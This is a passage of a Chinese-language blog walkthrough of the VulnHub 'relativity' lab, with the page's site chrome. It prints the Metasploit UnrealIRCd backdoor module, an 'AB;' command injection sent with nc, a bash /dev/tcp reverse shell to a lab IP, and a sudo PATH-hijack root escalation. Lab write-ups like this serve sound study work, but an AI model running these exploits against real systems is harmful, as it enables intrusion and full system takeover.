+<p><img src="https://pic1.imgdb.cn/item/697b96b6681ba7926cdb2529.png"></p>
+<p>那么接下来就用 SSH 做端口转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i /tmp/.ssh/id_rsa -L 6667:127.0.0.1:6667 mauk@192.168.202.162</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b9747681ba7926cdb252e.png"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="UnrealIRCd（CVE-2010-2075）"><a href="#UnrealIRCd（CVE-2010-2075）" class="headerlink" title="UnrealIRCd（CVE-2010-2075）"></a>UnrealIRCd（CVE-2010-2075）</h3><p>使用 nmap 扫描转发到本地的 6667 端口，看看什么版本</p>
+<p><img src="https://pic1.imgdb.cn/item/697b97c6681ba7926cdb2532.png"></p>
+<p>搜索这个服务名 <code>UnrealIRCD</code> 只有一个 Payload 能打，但是失败了</p>
+<p><img src="https://pic1.imgdb.cn/item/697b994d681ba7926cdb2541.png"></p>
+<p>翻找源码</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::Tcp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(</span><br><span class="line">      update_info(</span><br><span class="line">        info,</span><br><span class="line">        <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;UnrealIRCD 3.2.8.1 Backdoor Command Execution&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">          This module exploits a malicious backdoor that was added to the</span></span><br><span class="line"><span class="string">          Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the</span></span><br><span class="line"><span class="string">          Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.</span></span><br><span class="line"><span class="string">        &#125;</span>,</span><br><span class="line">        <span class="string">&#x27;Author&#x27;</span> =&gt; [ <span class="string">&#x27;hdm&#x27;</span> ],</span><br><span class="line">        <span class="string">&#x27;License&#x27;</span> =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">        <span class="string">&#x27;References&#x27;</span> =&gt; [</span><br><span class="line">          [ <span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2010-2075&#x27;</span> ],</span><br><span class="line">          [ <span class="string">&#x27;OSVDB&#x27;</span>, <span class="string">&#x27;65445&#x27;</span> ],</span><br><span class="line">          [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt&#x27;</span> ]</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;Platform&#x27;</span> =&gt; [<span class="string">&#x27;unix&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;Arch&#x27;</span> =&gt; <span class="variable constant_">ARCH_CMD</span>,</span><br><span class="line">        <span class="string">&#x27;Privileged&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;Payload&#x27;</span> =&gt; &#123;</span><br><span class="line">          <span class="string">&#x27;Space&#x27;</span> =&gt; <span class="number">1024</span>,</span><br><span class="line">          <span class="string">&#x27;DisableNops&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">          <span class="string">&#x27;Compat&#x27;</span> =&gt;</span><br><span class="line">                        &#123;</span><br><span class="line">                          <span class="string">&#x27;PayloadType&#x27;</span> =&gt; <span class="string">&#x27;cmd&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;RequiredCmd&#x27;</span> =&gt; <span class="string">&#x27;generic perl ruby telnet&#x27;</span>,</span><br><span class="line">                        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;Targets&#x27;</span> =&gt; [</span><br><span class="line">          [ <span class="string">&#x27;Automatic Target&#x27;</span>, &#123;&#125;]</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2010-06-12&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Notes&#x27;</span> =&gt; &#123;</span><br><span class="line">          <span class="string">&#x27;Reliability&#x27;</span> =&gt; <span class="variable constant_">UNKNOWN_RELIABILITY</span>,</span><br><span class="line">          <span class="string">&#x27;Stability&#x27;</span> =&gt; <span class="variable constant_">UNKNOWN_STABILITY</span>,</span><br><span class="line">          <span class="string">&#x27;SideEffects&#x27;</span> =&gt; <span class="variable constant_">UNKNOWN_SIDE_EFFECTS</span></span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">Opt</span><span class="symbol">:</span><span class="symbol">:RPORT</span>(<span class="number">6667</span>)</span><br><span class="line">      ]</span><br><span class="line">    )</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">    connect</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;Connected to <span class="subst">#&#123;rhost&#125;</span>:<span class="subst">#&#123;rport&#125;</span>...&quot;</span>)</span><br><span class="line">    banner = sock.get_once(-<span class="number">1</span>, <span class="number">30</span>)</span><br><span class="line">    banner.to_s.split(<span class="string">&quot;\n&quot;</span>).each <span class="keyword">do</span> |<span class="params">line</span>|</span><br><span class="line">      print_line(<span class="string">&quot;    <span class="subst">#&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;Sending backdoor command...&quot;</span>)</span><br><span class="line">    sock.put(<span class="string">&quot;AB;&quot;</span> + payload.encoded + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Wait for the request to be handled</span></span><br><span class="line">    <span class="number">1</span>.upto(<span class="number">120</span>) <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">break</span> <span class="keyword">if</span> session_created?</span><br><span class="line"></span><br><span class="line">      select(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">0.25</span>)</span><br><span class="line">      handler()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    disconnect</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>在 2009 年 11 月到 2010 年 6 月期间，UnrealIRCd 的官方镜像站点被黑客入侵，源码包（<code>Unreal3.2.8.1.tar.gz</code>）被替换。黑客在核心代码 <code>s_serv.c</code> 中加入了一段看似不起眼但极其致命的代码：</p>
+<blockquote>
+<p><strong>逻辑伪代码：</strong> 如果接收到的字符串前两个字符是 <code>AB</code>，则跳过 IRC 协议解析，直接调用 <code>system()</code> 函数执行其后的命令</p>
+</blockquote>
+<p>所以我们尝试手动复现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 尝试在目标机 /tmp 目录下创建一个探测文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;AB; touch /tmp/pwned_by_interview&quot;</span> | nc -vn 127.0.0.1 6667</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b984e681ba7926cdb2533.png"></p>
+<p>成功</p>
+<p><img src="https://pic1.imgdb.cn/item/697b9861681ba7926cdb253d.png"></p>
+<p>直接反弹 Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;AB; bash -i &gt;&amp; /dev/tcp/192.168.202.128/9999 0&gt;&amp;1&quot;</span> | nc -vn 127.0.0.1 6667</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b9bef681ba7926cdb254f.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/697b9c42681ba7926cdb2552.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Python-升级为交互式-Shell"><a href="#Python-升级为交互式-Shell" class="headerlink" title="Python 升级为交互式 Shell"></a>Python 升级为交互式 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b9cef681ba7926cdb2554.png"></p>
+<h3 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h3><p>按照上面给的提示，我们可以以 <code>root</code> 身份无需密码运行这个程序</p>
+<p><img src="https://pic1.imgdb.cn/item/697b9d86681ba7926cdb2557.png"></p>
+<p>报错 <code>error: (12)</code> 也并没有提权成功，检查一下字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings auth_server</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b9f0f681ba7926cdb2563.png"></p>
+<p>这里有个关键内容，扔给 AI 也可以直接出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fortune -s | /usr/bin/cowsay</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong><code>fortune -s</code></strong><ul>
+<li><code>fortune</code>：显示随机名言&#x2F;格言&#x2F;笑话的程序</li>
+<li><code>-s</code> 参数：short 模式，只显示简短的名言</li>
+</ul>
+</li>
+<li><strong><code>|</code></strong>：管道符号，将前一个命令的输出作为后一个命令的输入</li>
+<li><strong><code>/usr/bin/cowsay</code></strong><ul>
+<li><code>cowsay</code>：将一个 ASCII 艺术牛说话的程序</li>
+<li><code>/usr/bin/</code>：命令的完整路径</li>
+</ul>
+</li>
+</ol>
+<p><code>cowsay</code> 使用了<strong>绝对路径</strong> (<code>/usr/bin/cowsay</code>)，这很难利用</p>
+<p>但 <code>fortune</code> <strong>没有使用绝对路径</strong></p>
+<p>既然 <code>auth_server</code> 可以通过 <code>sudo</code> 运行，且它在调用 <code>fortune</code> 时是去系统的 <code>$PATH</code> 中搜索该程序</p>
+<p>那么，如果我们能伪造一个“恶意的” <code>fortune</code> 命令并让程序先找到它，我们就能获得 root 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 准备程序</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -p&#x27;</span> &gt; /tmp/fortune</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/fortune</span><br><span class="line"></span><br><span class="line"><span class="comment"># 劫持 PATH 环境变量： 将 /tmp 目录加入到 $PATH 的最前面</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>由于我们修改了 <code>$PATH</code>，系统会优先在 <code>/tmp</code> 下找到我们的恶意 <code>fortune</code> 并以 root 权限执行</p>
+<p><img src="https://pic1.imgdb.cn/item/697ba0c0681ba7926cdb3340.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/LFI/" rel="tag" title="LFI">LFI</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SQL-%E6%B3%A8%E5%85%A5/" rel="tag" title="SQL 注入">SQL 注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag" title="内网穿透">内网穿透</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" rel="tag" title="弱口令">弱口令</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag" title="提权">提权</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub xerxes：1" class="lazyload">
+        <a href="/2026/04/01/xerxes%201/" aria-label="前一篇: VulnHub xerxes：1" title="前一篇: VulnHub xerxes：1"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            VulnHub xerxes：1
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub LAMPSecurity：CTF7" class="lazyload">
+      <a href="/2026/04/01/LAMPSecurity%20CTF7/" aria-label="后一篇: VulnHub LAMPSecurity：CTF7"  title="后一篇: VulnHub LAMPSecurity：CTF7"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          VulnHub LAMPSecurity：CTF7
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        34.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:56
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dev-random-relativity-v1-0-1"><span class="toc-number">1.</span> <span class="toc-text">&#x2F;dev&#x2F;random: relativity (v1.0.1)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">1.1.</span> <span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mod-sql%EF%BC%88CVE-2009-0542%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">mod_sql（CVE-2009-0542）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI"><span class="toc-number">1.2.</span> <span class="toc-text">LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#page"><span class="toc-number">1.2.1.</span> <span class="toc-text">page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">1.3.1.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E8%BD%AC%E5%8F%91"><span class="toc-number">1.4.1.</span> <span class="toc-text">SSH 转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UnrealIRCd%EF%BC%88CVE-2010-2075%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">UnrealIRCd（CVE-2010-2075）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.6.1.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.6.2.</span> <span class="toc-text">环境变量劫持</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub /dev/random：relativity (v1.0.1)",
+          url: "http://example.com/2026/04/01/dev-random%20relativity%20(v1.0.1)/",
+          excerpt: "",
+          description: "",
+          stripContent: "&amp;#x2F;dev&amp;#x2F;random: relativity (v1.0.1)项目地址：https://download.vulnhub.com/devrandom/relativity_1.0.1.zip 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  80 端口是静态页面，只有一张图片  观察到 banner 有一个 mod_sql  mod_sql 是 ProFTPD 用于支持数据库后端验证的一个知名模块 明",
+          date: "Wed Apr 01 2026 16:15:00 GMT+0800",
+          updated: "Wed Apr 01 2026 17:07:10 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
